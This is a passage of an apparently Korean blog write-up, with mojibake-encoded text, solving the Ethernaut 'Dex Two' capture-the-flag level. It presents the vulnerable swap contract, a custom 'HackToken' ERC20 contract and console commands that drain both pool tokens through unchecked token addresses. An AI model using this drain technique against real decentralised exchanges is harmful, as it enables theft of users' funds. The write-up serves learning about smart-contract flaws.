---
emoji: ๐งข
title: (Ethernaut ์ทจ์ฝ์  23) Dex Two
date: '2022-02-11 19:48:00'
author: ํ์ฑ์
tags: ethernaut DexTwo vulnerability 23
categories: ์ทจ์ฝ์ ๋ถ์
---


# ๐ 1. Dex Two
__Difficulty 4/10__

- ์น๋ฆฌ ์กฐ๊ฑด
- ์ฝ๋ ๋ถ์
- ํ์ด
์์๋ก ์งํ ๋  ๊ฒ์ด๋ค.

- - -

## ์น๋ฆฌ ์กฐ๊ฑด
- DexTwo Contract์ Token 1๊ณผ Token 2์ balance๋ฅผ ์ ๋ถ ์์งํ๊ธฐ


- - -
## ๋ค์ด๊ฐ๊ธฐ ์ 
22. Dex contract์ ๋ง์ฐฌ๊ฐ์ง๊ณ  DexTwo contact๋ DEX์ ERC20์ ๋ํ ์ง์์ด ์์ด์ผ ํ๋ค.
Uniswap์ ์ฝ๋๋ฅผ ์ ๋ถ ๋ถ์ํ์ง๋ ๋ชปํ๋๋ผ๋ ์๋์๋ฆฌ์ ๋ํด์๋ ์์์ผํ๋ค.
๋ํ ERC20 standard์ ์ด๋ค function์ด ํ์ํ์ง, ์ด๋ป๊ฒ ์๋ํ๋์ง ๊ณต๋ถํด์ผํ๋ค.
์๋ ๋งํฌ๋ค์ ํตํด ์ถฉ๋ถํ ์ต์ํด ์ง ํ ํ๊ธฐ๋ฅผ ๊ถ์ฅํ๋ค. ๋งํฌ ์ด์ธ์ Youtube์๋ ์ข์ ์๋ฃ๋ค์ด ๋ง๋ค!
- [Uniswap](https://docs.uniswap.org/protocol/V2/introduction)
- [openzeppelin ERC20 contract](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20)

## ์ฝ๋ ๋ถ์
๋ถ์์ ์ฃผ์์ ์์ต๋๋ค!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract DexTwo  {
    using SafeMath for uint;
    address public token1;
    address public token2;
    constructor(address _token1, address _token2) public {
        token1 = _token1;
        token2 = _token2;
    }

    function swap(address from, address to, uint amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint swap_amount = get_swap_amount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swap_amount);
        IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
    }

    function add_liquidity(address token_address, uint amount) public{
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function get_swap_amount(address from, address to, uint amount) public view returns(uint){
        return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint amount) public {
        SwappableTokenTwo(token1).approve(spender, amount);
        SwappableTokenTwo(token2).approve(spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint){
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }
}
```

<br/>
Dex contract์ DexTwo contract์ ๋ค๋ฅธ ์ ์ DexTwo๋ swap()์์ token 1๊ณผ token 2๋ฅผ ํ์ธํ์ง ์๋๋ค.
์ฆ ์ด๋ token์ด๋ผ๋ swap ๋  ์ ์๋ค.
```solidity
// ์ด require ๋ฌธ์ ์ ์ธ๋์๋ค.
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```


- - -

## ํ์ด
์ด๋ฒ ๋ฌธ์ ์์ ์ฐ๋ฆฌ๋ Dex๊ฐ ๊ฐ์ง ๋ชจ๋  ํ ํฐ์ ์๋ชจํ๋ฉด ๋๋ค. 22๋ฒ Dex ๋ฌธ์ ๋ฅผ ์ ์ดํดํ๊ณ  ์์ด์ผ ํ ์ ์๋ค.
๊ทธ๋ ๋ค๋ฉด ์ด๋ป๊ฒ ์๋ชจํ  ์ ์์๊น? ํํธ๋ฅผ ๋ณด์
- ์ค์ ๋ฐฉ๋ฒ์ ์ด๋ป๊ฒ ์์ ๋์๋๊ฐ? How has the swap method been modified?
- ๊ณต๊ฒฉํ ๋์ ์ปค์คํ ํ ํฐ contract๋ฅผ ์ฌ์ฉํ  ์ ์๋๊ฐ? Could you use a custom token contract in your attack?


์ฝ๋๋ถ์ ์๋์ ๋ณด๋ฉด Dex contract์ DexTwo contract๊ฐ ์ด๋ป๊ฒ ์์ ๋์๋์ง ์ ์ ์๋ค.
Dex contract์ ๋ค๋ฅด๊ฒ ๋ ์ด์ Token address๋ฅผ ๊ฒ์ฆํ์ง ์๋๋ค.

๊ทธ๋ ๋ค๋ฉด ์ฐ๋ฆฌ๊ฐ ๋ง๋  Custom Token์ผ๋ก๋ swap์ด ๊ฐ๋ฅํ์ง ์์๊น?

Custom Token์ ์ฌ์ฉํ attack ์๋๋ฆฌ์ค๋ฅผ ๋ณด์.
1. ERC20 standard๋ฅผ ์ฌ์ฉํ๋ Custom Token์ Deployํ๋ค.
2. Deployํ Token์ DexTwo contract๊ฐ ์ฌ์ฉํ  ์ ์๋๋ก approveํด์ค๋ค.
3. approve๋ ๊ฐ์ ์ค 100๊ฐ๋ง liquidity์ addํด์ค๋ค(add_liquidity function ์ฌ์ฉ).
4. Token 1์ 1๋1 ๋น์จ๋ก swapํ๋ค(100๊ฐ ์ฃผ๊ณ  100๊ฐ ๋ฐ๊ณ ).
5. ์ดํ Dex contract๋ 200๊ฐ์ Custom Token์ ๊ฐ์ง๊ฒ ๋๋ค(Token 1:0๊ฐ, Token 2: 100๊ฐ, Custom Token: 200๊ฐ). 
6. Token 2๋ฅผ 2๋1 ๋น์จ๋ก swapํด์ค๋ค(Custom Token 200๊ฐ ์ฃผ๊ณ , Token 2 100๊ฐ ๋ฐ๊ธฐ).
7. Dex contract๊ฐ ๊ฐ์ง Token 1๊ณผ 2์ balance๋ฅผ ๋ณด๋ฉด 0์ด๋ ๊ฒ์ ํ์ธ ํ  ์ ์๋ค.

<br/>

Token ๊ตํ ๋น์จ์ ์๋์ ๊ฐ์ ๊ณต์์ ์ฌ์ฉํด ๊ฒฐ์ ๋๋ค.
`(amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))`
22๋ฒ ๋ฌธ์ ๋ฅผ ์ ์ดํดํ๊ณ  ํ์๋ค๋ฉด ์์ 1๋1, 2๋1 ๋น์จ์ด ๋ฌด์จ๋ง์ธ์ง ์ ๊ฒ์ด๋ผ๊ณ  ์๊ฐํ๋ค.

<br/>

๊ทธ๋ ๋ค๋ฉด Attack์ ์ฌ์ฉํ  contract๋ฅผ ๋ณด์.
ERC20 Standard๋ฅผ ์ดํดํ๊ณ  ์์ด์ผ๋ง ํ๋ค!
```solidity
import "@openzeppelin/contracts@3.4.1/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts@3.4.1/token/ERC20/ERC20.sol";

contract HackToken is ERC20 {
    //์๋ก์ด Token์ ๋ฐํํ๊ณ  ๋์์ mintํ๋ค.
    constructor () public ERC20("HackToken", "HAC") {
        _mint(msg.sender, 1000000 * (10 ** uint256(decimals())));
    }

}
```
<br/>

์ HackToken์ Remix๋ฅผ ์ฌ์ฉํด contract๋ฅผ deployํ๋ค.
๋ฐํํ Token์ metamask์์๋ ํ์ธํ  ์ ์๋ค.
![hackToken](./hacktoken.png)
import tokens์ ๋ค์ด๊ฐ HackToken์ ์ฃผ์๋ฅผ ์๋ ฅํ๋ฉด ์์๊ฐ์ด HackToken์ ์ฌ๋ถ์ธ HAC๋ฅผ ํ์ธ ํ  ์ ์๋ค.

<br/>

Token ๋ฐํ์ด ๋๋ฌ๋ค๋ฉด liquidity์ addํ  ์ ์๋๋ก DexTwo๋ฅผ `approve` ํด์ฃผ์ด์ผํ๋ค.
Remix์์ Deploy๋ contract์์ `approve`์ ์ธ์๋ฅผ ๋ฃ๊ณ  ์คํ์ํจ๋ค. ๊ทธ๋ `spender`์ DexTwo์ ์ฃผ์์ด๊ณ  `amount`๋ ์์ผ๋ก `approve`๋ฅผ ๋ํ์ง ์์ ์ ์๋๋ก `1000`์ ์๋ ฅ ํ transaction์ ๋ณด๋ธ๋ค.

์ด์  Ethernauts๋ก ๋์์ console์ฐฝ๊ณผ ์ํธ์์ฉํ๋ค.
ctrl + shift + i๋ฅผ ๋๋ฌ console์ฐฝ์ ํ์ฑํ ์ํค์
```js
// DexTwo๊ฐ ๋ด token 1๊ณผ 2๋ฅผ transferFrom ํ  ์ ์๋๋ก approve ํด์ค๋ค.
await contract.approve(instance, "1000000000000000000000")
// liquidity์ hacking token 100๊ฐ๋ฅผ add ํด์ค๋ค.
await contract.add_liquidity("hacking contract address",100)
// hack token 100๊ฐ๋ฅผ token 1 100๊ฐ์ swap ํด์ค๋ค.
await contract.swap("hacking contract address","Token 1 address", 100)
// ์ด์  liquidity pool์ ใHAC token์ด 200๊ฐ ์์์ผ๋ก 200๊ฐ๋ฅผ swap ํด์ค๋ค.
await contract.swap("hacking contract address","Token 2 address", 200)
// Dex์ Token1๊ณผ 2์ balance๊ฐ 0์ด ๋ ๊ฒ์ ํ์ธํ๋ค.
await contract.balanceOf(await contract.token1(), instance).then(x=> x.toString())
await contract.balanceOf(await contract.token2(), instance).then(x=> x.toString())
```


token1๊ณผ 2, ๋ชจ๋๊ฐ balance๊ฐ 0์ด ๋ ๊ฒ์ ํ์ธํ๋ค๋ฉด ethernaut์ผ๋ก ๋์์ Submit instance๋ฅผ ๋๋ฅด๊ณ  ์กฐ๊ธ ๊ธฐ๋ค๋ฆฌ๋ฉด block์ด mine๋๊ณ , ์๋์ ๊ฐ์ด ๋จ๋ฉฐ ๋ง๋ฌด๋ฆฌ๋๋ค.
```
ูฉ(- ฬฎฬฎฬ-ฬ)?ถ Well done, You have completed this level!!!
```
- - -

## ๋ง๋ฌด๋ฆฌ
์ด๋ฒ ๋ฌธ์ ๋ 22. Dex ๋ฌธ์ ์์ ๋ฐ๋ ๋ถ๋ถ์ด ๋ชํํด์ ์ทจ์ฝ์ ์ ์ฝ๊ฒ ์ฐพ์ ์ ์์๋ค. 22๋ฒ๊ณผ 23๋ฒ์ ํ๋ฉด์ ์ฝ๊ฐ์ด๋จ์ swap์ ๋ํด ๊นจ๋ฌ์ ๊ฒ ๊ฐ๋ค. ๋ํ ์ด ๋ฌธ์ ์์๋ ERC20 Token์ด๋ผ๊ณ ํด์ ๋ชจ๋ ์ ๋ขฐํ  ์ ์๋ ๊ฒ์ ์๋๋ผ๋ ๊ตํ์ ์ฃผ๋ ๊ฒ ๊ฐ๋ค. ์ด์  ์ผ๋ง ๋จ์ง ์์ ๋ฌธ์ ๋ค๋ ์ด์ฌํ ํ์ด์ ์ด๋ณด์ ํฐ๋ฅผ ๋ฒ์ด๋ณด์ :)


- - -
## REF
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org

```toc

```